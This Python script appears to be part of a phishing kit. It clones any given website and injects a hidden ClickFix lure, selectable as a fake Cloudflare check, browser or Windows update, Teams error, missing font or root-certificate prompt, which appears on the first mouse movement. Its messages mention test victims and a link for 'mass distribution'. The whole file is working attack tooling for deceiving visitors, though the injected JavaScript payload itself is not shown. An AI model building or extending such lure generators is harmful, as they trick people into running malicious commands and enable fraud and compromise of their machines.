import os
import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import shutil

# Configuration
CAMPAIGNS_DIR = os.path.join('templates', 'lures', 'scenarios')
TRAPS_DIR = os.path.join('templates', 'traps')

def sanitize_filename(filename):
    """Sanitize a filename to prevent path traversal."""
    return re.sub(r'[^a-zA-Z0-9\.\-_]', '', filename)

def clone_site(url, campaign_name, trap_type='cloudflare'):
    """
    Clones a website and injects a ClickFix trap.
    
    Args:
        url (str): The URL to scrape.
        campaign_name (str): The name of the folder to save the campaign in.
        trap_type (str): The type of trap to inject ('cloudflare', 'chrome_update', 'teams_error').
    """
    # Sanitize campaign name to prevent path traversal
    safe_campaign_name = sanitize_filename(campaign_name)
    if safe_campaign_name != campaign_name:
        print(f"[-] Invalid campaign name. Sanitized to: {safe_campaign_name}")
    
    campaign_name = safe_campaign_name
    
    print(f"[*] Cloning {url} into lures/scenarios/{campaign_name}...")
    
    campaign_path = os.path.join(CAMPAIGNS_DIR, campaign_name)
    if os.path.exists(campaign_path):
        # Security: Check for symlinks before removal to prevent symlink attacks
        if os.path.islink(campaign_path):
            os.unlink(campaign_path)
        else:
            shutil.rmtree(campaign_path)
    os.makedirs(campaign_path)
    
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        base_url = url
        
        for tag in soup.find_all(['link', 'script', 'img']):
            if tag.name == 'link' and tag.get('href'):
                tag['href'] = urljoin(base_url, tag['href'])
            elif tag.name == 'script' and tag.get('src'):
                tag['src'] = urljoin(base_url, tag['src'])
            elif tag.name == 'img' and tag.get('src'):
                tag['src'] = urljoin(base_url, tag['src'])
                
        jinja_block = f"""
        <script src="{{{{ url_for('static', filename='js/clickfix.js') }}}}"></script>
        <div id="trap-container" style="display: none;">
            {{% if trap_type %}}
                {{% include 'traps/' + trap_type + '.html' ignore missing %}}
            {{% else %}}
                {{% include 'traps/{trap_type}.html' ignore missing %}}
            {{% endif %}}
        </div>
        <script>
            document.addEventListener('mousemove', function() {{
                const trapContainer = document.getElementById('trap-container');
                if (trapContainer && trapContainer.style.display === 'none') {{
                    trapContainer.style.display = 'block';
                }}
            }}, {{ once: true }});
        </script>
        """
        
        html_content = str(soup)
        
        # Find the closing body tag and insert before it
        if "</body>" in html_content:
            html_content = html_content.replace("</body>", f"{jinja_block}\n</body>")
        else:
            html_content += f"\n{jinja_block}"
            
        print(f"[*] Injected dynamic trap logic (Default: {trap_type}).")

        with open(os.path.join(campaign_path, 'index.html'), 'w', encoding='utf-8') as f:
            f.write(html_content)
            
        print(f"[+] Campaign '{campaign_name}' created successfully!")
        print(f"    Access at: /s/{campaign_name}")
        print(f"    (Use ?uid=demo_victim for testing, or send clean link for mass distribution)")
        
    except Exception as e:
        print(f"[-] Error cloning site: {e}")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Clone a website and inject a ClickFix trap.')
    parser.add_argument('url', help='URL of the website to clone')
    parser.add_argument('name', help='Name of the campaign (folder name)')
    parser.add_argument('--trap', default='cloudflare', choices=['cloudflare', 'chrome_update', 'teams_error', 'windows_update', 'missing_font', 'root_certificate', 'filefix'], help='Type of trap to inject')
    
    args = parser.parse_args()
    
    clone_site(args.url, args.name, args.trap)